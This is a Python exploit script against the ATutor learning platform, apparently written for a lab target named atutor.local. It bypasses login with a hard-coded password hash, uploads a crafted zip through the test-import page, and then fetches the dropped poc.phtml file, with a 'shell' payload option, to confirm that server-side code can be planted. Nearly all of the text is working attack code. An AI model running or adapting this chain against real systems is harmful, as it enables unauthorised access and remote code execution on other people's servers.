import sys
import requests
from createZip import _zip
from authBypass import login_by_hash


def upload(host, _type):

    # Login
    sess = login_by_hash(host, "56b11a0603c7b7b8b4f06918e1bb5378ccd481cc")
    
    # Debug
    proxies = { 'http': 'http://localhost:8080' }
    sess.proxies.update(proxies)
    
    # Go to upload webpage
    sess.get("http://atutor.local/ATutor/bounce.php?course=4")
    sess.get("http://atutor.local/ATutor/mods/_standard/tests/index.php")
    
    protocol        = "http://"
    path            = "/ATutor/mods/_standard/tests/import_test.php"
    target          = "%s%s%s" % (protocol, host, path)

    d = {
        "submit_import": "Import"
    }

    # Create zip file: poc.zip
    zip_file = _zip(_type)
    f = {'file': open(zip_file.name,'rb')}
    
    r = sess.post(target, files=f, data=d)
    
    res = r.text
    if "XML error: Not well-formed (invalid token) at line 1" in res:
        print("[+] File upload successful")
    else:
        print("[-] File upload failure!")
        
    # Access uploaded file
    r = sess.get("http://atutor.local/ATutor/mods/poc/poc.phtml")
    if r.status_code == 200:
        print("[+] File access successful")
    else:
        print("[-] File access failure!")
    
def main():
    if len(sys.argv) != 3:
        print("[!] usage: %s <target> <type:zip/xml/invalid/dir/web/phtml/shell>" % sys.argv[0])
        print('[!] eg: python %s atutor.local phtml' % sys.argv[0])
        sys.exit(-1)
    
    host = sys.argv[1]
    _type = sys.argv[2]

    upload(host, _type)


if __name__ == "__main__":
    main()